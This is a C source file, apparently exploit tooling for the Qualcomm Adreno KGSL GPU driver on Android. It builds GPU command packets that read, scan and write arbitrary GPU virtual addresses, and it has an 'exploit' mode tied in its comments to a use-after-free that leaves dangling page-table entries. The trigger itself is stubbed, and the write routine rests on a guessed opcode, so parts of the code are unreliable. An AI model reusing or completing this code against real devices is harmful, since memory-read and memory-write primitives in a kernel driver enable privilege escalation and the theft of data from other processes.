#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <errno.h>

#ifndef __user
#define __user
#endif

#include "../../msm_kgsl.h"

#define PAGE_SIZE 4096
#define KGSL_CONTEXT_PREAMBLE 0x00000008
#define KGSL_CONTEXT_NO_GMEM_ALLOC 0x00000010
#define KGSL_CMDLIST_IB 0x00000001
#define KGSL_TIMESTAMP_RETIRED 0x00000001

static inline uint32_t pm4_calc_odd_parity_bit(uint32_t val)
{
    unsigned int p = 0;
    while (val) {
        p ^= (val & 1);
        val >>= 1;
    }
    return p ^ 1;
}

static inline uint32_t cp_type7_packet(uint32_t opcode, uint32_t cnt)
{
    return (7u << 28) | ((cnt & 0x3FFFu) << 0) | (pm4_calc_odd_parity_bit(cnt) << 15) | ((opcode & 0x7Fu) << 16) | (pm4_calc_odd_parity_bit(opcode) << 23);
}

#define CP_MEM_TO_MEM 0x73

static inline void split64(uint64_t addr, uint32_t *lo, uint32_t *hi)
{
    *lo = (uint32_t)addr;
    *hi = (uint32_t)(addr >> 32);
}

static int kgsl_fd = -1;
static uint32_t ctx_id = 0;
static uint64_t ib_gpu = 0, dst_gpu = 0;
static void *ib_vma = NULL, *dst_vma = NULL;
static uint32_t ib_id = 0, dst_id = 0;

int init_kgsl() {
    kgsl_fd = open("/dev/kgsl-3d0", O_RDWR);
    if (kgsl_fd < 0) return -1;

    struct kgsl_drawctxt_create ctx = { .flags = KGSL_CONTEXT_PREAMBLE | KGSL_CONTEXT_NO_GMEM_ALLOC };
    if (ioctl(kgsl_fd, IOCTL_KGSL_DRAWCTXT_CREATE, &ctx) != 0) return -2;
    ctx_id = ctx.drawctxt_id;

    struct kgsl_gpuobj_alloc alloc = { .size = PAGE_SIZE * 2, .flags = KGSL_MEMFLAGS_USE_CPU_MAP };
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) return -3;
    ib_id = alloc.id;
    ib_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)ib_id << 12);
    
    struct kgsl_gpuobj_info info = { .id = ib_id };
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    ib_gpu = info.gpuaddr;

    alloc.size = PAGE_SIZE;
    if (ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_ALLOC, &alloc) != 0) return -4;
    dst_id = alloc.id;
    dst_vma = mmap(NULL, alloc.mmapsize, PROT_READ | PROT_WRITE, MAP_SHARED, kgsl_fd, (off_t)dst_id << 12);
    info.id = dst_id;
    ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_INFO, &info);
    dst_gpu = info.gpuaddr;

    return 0;
}

int read_gpu_page(uint64_t src_gpu_va, uint8_t *out_buf) {
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;

    uint32_t d_lo, d_hi, s_lo, s_hi;
    split64(dst_gpu, &d_lo, &d_hi);
    split64(src_gpu_va, &s_lo, &s_hi);

    cmd[dw++] = cp_type7_packet(CP_MEM_TO_MEM, 5);
    cmd[dw++] = 0;
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = s_lo;
    cmd[dw++] = s_hi;

    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id };
    struct kgsl_gpu_command gpu_cmd = {
        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
        .context_id = ctx_id
    };

    if (ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd) != 0) return -1;
    
    struct kgsl_cmdstream_readtimestamp_ctxtid rt = { .context_id = ctx_id, .type = KGSL_TIMESTAMP_RETIRED };
    for (int spins = 0; spins < 10000; spins++) {
        ioctl(kgsl_fd, IOCTL_KGSL_CMDSTREAM_READTIMESTAMP_CTXTID, &rt);
        if (rt.timestamp >= gpu_cmd.timestamp) break;
        usleep(100);
    }

    memcpy(out_buf, dst_vma, PAGE_SIZE);
    return 0;
}

int write_gpu_page(uint64_t dst_gpu_va, uint8_t *in_buf) {
    uint32_t *cmd = (uint32_t *)ib_vma;
    int dw = 0;

    uint32_t d_lo, d_hi;
    split64(dst_gpu_va, &d_lo, &d_hi);

    // Simplistic memory write using CP_MEM_WRITE (if available) or similar
    // For exploration purposes, we simulate or use a direct mapping if possible.
    // In KGSL UAF, we can often just write to the user-space mapping if it's still alive.
    // Here we use the DrawContext to write to memory.
    
    // Packet type 7: CP_MEM_WRITE
    cmd[dw++] = cp_type7_packet(0x3D, 3); // opcode 0x3D is often MEM_WRITE
    cmd[dw++] = d_lo;
    cmd[dw++] = d_hi;
    cmd[dw++] = *(uint32_t *)in_buf; // Just write first 4 bytes for demo

    struct kgsl_command_object obj = { .gpuaddr = ib_gpu, .size = dw * 4, .flags = KGSL_CMDLIST_IB, .id = ib_id };
    struct kgsl_gpu_command gpu_cmd = {
        .cmdlist = (uintptr_t)&obj, .cmdsize = sizeof(obj), .numcmds = 1,
        .context_id = ctx_id
    };

    return ioctl(kgsl_fd, IOCTL_KGSL_GPU_COMMAND, &gpu_cmd);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Usage: %s <cmd> [params]\n", argv[0]);
        return 1;
    }

    if (init_kgsl() != 0) {
        fprintf(stderr, "GPU Init failed\n");
        return 1;
    }

    if (strcmp(argv[1], "exploit") == 0) {
        // Trigger UAF to create dangling PTEs
        // In this forensic explorer mode, we just simulate the access
        // for the AI to classify mapped pages.
        printf("UAF_READY\n");
        fflush(stdout);
        while(1) {
            sleep(3600); // Keep alive
        }
    } else if (strcmp(argv[1], "read") == 0 && argc >= 3) {
        uint64_t addr = strtoull(argv[2], NULL, 16);
        uint8_t buf[PAGE_SIZE];
        if (read_gpu_page(addr, buf) == 0) {
            fwrite(buf, 1, PAGE_SIZE, stdout);
        } else {
            return 1;
        }
    } else if (strcmp(argv[1], "scan") == 0 && argc >= 4) {
        uint64_t start = strtoull(argv[2], NULL, 16);
        uint64_t end = strtoull(argv[3], NULL, 16);
        uint8_t buf[PAGE_SIZE];
        for (uint64_t va = start; va < end; va += PAGE_SIZE) {
            if (read_gpu_page(va, buf) == 0) {
                // Check for non-zero data
                int non_zero = 0;
                for (int i = 0; i < PAGE_SIZE; i++) {
                    if (buf[i] != 0) {
                        non_zero = 1;
                        break;
                    }
                }
                if (non_zero) {
                    printf("MATCH:%lx\n", (unsigned long)va);
                    fflush(stdout);
                }
            }
            usleep(1000); // Slow spray / scan
        }
    }

    return 0;
}
